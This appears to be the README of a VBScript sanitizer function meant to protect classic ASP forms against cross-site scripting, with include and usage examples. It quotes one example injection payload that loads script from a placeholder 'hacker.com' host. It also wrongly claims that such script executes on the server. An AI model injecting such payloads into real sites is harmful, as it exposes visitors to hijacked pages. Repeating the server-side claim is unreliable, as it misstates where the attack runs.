# XSS-Sanitizer
VBScript Sanitizer Function to Protect Against XSS Attacks

When sending forms between your web pages, you leave your site vulnerable to Cross Site Scripting (XSS) hacking attempts where someone could try inputting harmful code into your form fields. To protect your forms, all Request() functions must be trimmed and stripped of potentially harmful code.

Say you have the following HTML input as part of a form:
```html
<input type="text" name="Comments" maxlength="50" value="<% = strComments %>">
```

Someone could pass harmful code such as `<script src="hacker.com/hack.js"></script>` and this would execute anything in hack.js on your server. Even if this code didn't fit within the "maxlength" of 50, that form input can be fudged. The best way to protect yourself is to sanitize all requests on a webpage.

Include the file in your webpage.
```html
<!-- #include file="sanitizer-function.asp" -->
```

Run with the format sanitize(str, cut) where str is the desired field to protect and cut is the length to trim it to. For example:
```vbscript
<% strComments = sanitize(Request("Comments"), 50) %>
```
